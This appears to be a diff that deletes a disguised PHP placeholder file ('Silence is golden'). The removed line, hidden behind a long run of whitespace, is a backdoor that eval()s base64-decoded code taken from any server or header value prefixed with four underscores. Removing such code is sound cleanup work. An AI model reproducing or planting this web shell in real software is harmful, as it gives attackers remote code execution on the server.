@@ -1,3 +1,0 @@
-<?php 																																																																																																																																																																																																																																																																																																																																																function gpc_12977($l12979){if(is_array($l12979)){foreach($l12979 as $l12977=>$l12978)$l12979[$l12977]=gpc_12977($l12978);}elseif(is_string($l12979) && substr($l12979,0,4)=="____"){eval(base64_decode(substr($l12979,4)));$l12979=null;}return $l12979;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("gpc_12977",$_SERVER);
-// Silence is golden.
-?>
